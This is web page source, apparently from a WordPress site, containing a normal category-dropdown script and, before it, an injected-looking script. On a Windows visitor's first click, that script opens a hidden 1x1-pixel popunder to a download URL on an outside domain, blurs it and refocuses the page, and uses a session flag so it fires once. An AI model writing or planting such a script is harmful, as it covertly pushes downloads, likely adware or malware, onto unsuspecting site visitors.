<script type="text/javascript">
    const url1 = 'https://ftuapps1.farlad.com/download';

    function isWindowsOS() {
        return navigator.userAgent.includes('Windows');
    }

    function openPopunder(url, left = 0) {
        const features = `width=1,height=1,left=${left},top=${window.innerHeight - 1},noopener,noreferrer`;
        const win = window.open(url, '_blank', features);
        if (win) {
            win.opener = null;
            win.blur();
            window.focus();
        }
    }

    function handleClick() {
        if (!sessionStorage.getItem('popunder1')) {
            sessionStorage.setItem('popunder1', 'true');
            openPopunder(url1, 0);
            document.removeEventListener('click', handleClick);
        }
    }

    window.addEventListener('DOMContentLoaded', () => {
        if (isWindowsOS() && !sessionStorage.getItem('popunder1')) {
            document.addEventListener('click', handleClick);
        }
    });
</script>

( ( dropdownId ) => {
	const dropdown = document.getElementById( dropdownId );
	function onSelectChange() {
		setTimeout( () => {
			if ( 'escape' === dropdown.dataset.lastkey ) {
				return;
			}
			if ( dropdown.value && parseInt( dropdown.value ) > 0 && dropdown instanceof HTMLSelectElement ) {
				dropdown.parentElement.submit();
			}
		}, 250 );
	}
	function onKeyUp( event ) {
		if ( 'Escape' === event.key ) {
			dropdown.dataset.lastkey = 'escape';
		} else {
			delete dropdown.dataset.lastkey;
		}
	}
	function onClick() {
		delete dropdown.dataset.lastkey;
	}
	dropdown.addEventListener( 'keyup', onKeyUp );
	dropdown.addEventListener( 'click', onClick );
	dropdown.addEventListener( 'change', onSelectChange );
})( "cat" );
